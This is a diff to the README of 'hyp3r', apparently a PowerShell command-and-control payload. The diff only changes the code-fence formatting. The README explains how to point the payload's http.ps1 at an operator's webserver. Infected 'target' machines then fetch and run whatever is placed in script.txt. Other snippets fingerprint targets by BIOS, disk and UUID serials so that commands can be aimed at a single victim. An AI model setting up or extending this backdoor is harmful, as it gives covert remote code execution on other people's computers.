@@ -39,7 +39,7 @@ cd hyp3r/
   - Copy the contents of the `apache` folder to your webserver's page folder.
   - Edit lines `2`, `3` and `4` inside `http.ps1` as follows: 
 
-```
+```powershell
 $verurl = 'http://your_website_url_or_ip/script.txt'
 $url = 'http://your_website_url_or_ip'
 $stop = 'the syntax of your choice to force stop the payload on the target machine'
@@ -55,9 +55,9 @@ $stop = 'the syntax of your choice to force stop the payload on the target machi
 
 #### To run commands on the target computer(s) open the file called `script.txt` inside your webserver's page folder and modify its contents
   - Example:
-        ```
-        [System.Console]::Beep(1000,300)
-        ```
+```powershell
+[System.Console]::Beep(1000,300)
+```
 
   -the syntax above will result in a short *beep* given out by the target
 ### Notes:
@@ -65,22 +65,22 @@ $stop = 'the syntax of your choice to force stop the payload on the target machi
   - If you have multiple targets that listen to the same server the commands inside `script.txt` will be ran by all of the computers listening.
   - If you want to run a command only on one of the targets you will have to get a little creative:
 
-        ```
-        if($env:COMPUTERNAME -eq "TARGET-PC") {
-          echo "now it will only be executed by targets with the user TARGET-PC"
-        }
-        ```
+```powershell
+if($env:COMPUTERNAME -eq "TARGET-PC") {
+	echo "now it will only be executed by targets with the user TARGET-PC"
+}
+```
   - If the COMPUTERNAME identifier is way to simple and it brings up problems you can use the scripts unique identifier composed of the biosid hddid and uuid of the target computer
 
-        ```
-        $a=Get-WmiObject win32_bios | Format-List SerialNumber | out-string; $id_bios=$a.split(' ')[2].Trim(); #bios id
-	      $b=wmic diskdrive get serialnumber; $id_hdd=$b.split('\n')[2].Trim(); #hdd id
-	      $c=Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -Property UUID | out-string;$id_uuid=$c.split(' ')[64].Trim() #uuid
-        $ids=$ids=$id_bios, $id_hdd, $id_uuid; $ids=[system.String]::Join("_", $ids);
-        if($ids -eq "UNIQUE_IDENTIFIER") {
-          doStuff()
-        }
-        ```
+```powershell
+$a=Get-WmiObject win32_bios | Format-List SerialNumber | out-string; $id_bios=$a.split(' ')[2].Trim(); #bios id
+$b=wmic diskdrive get serialnumber; $id_hdd=$b.split('\n')[2].Trim(); #hdd id
+$c=Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -Property UUID | out-string;$id_uuid=$c.split(' ')[64].Trim() #uuid
+$ids=$ids=$id_bios, $id_hdd, $id_uuid; $ids=[system.String]::Join("_", $ids);
+if($ids -eq "UNIQUE_IDENTIFIER") {
+	doStuff()
+}
+```
 
 
   - You can get the UNIQUE_IDENTIFIER of a computer from the `data.txt` file inside the webserver's page folder: 
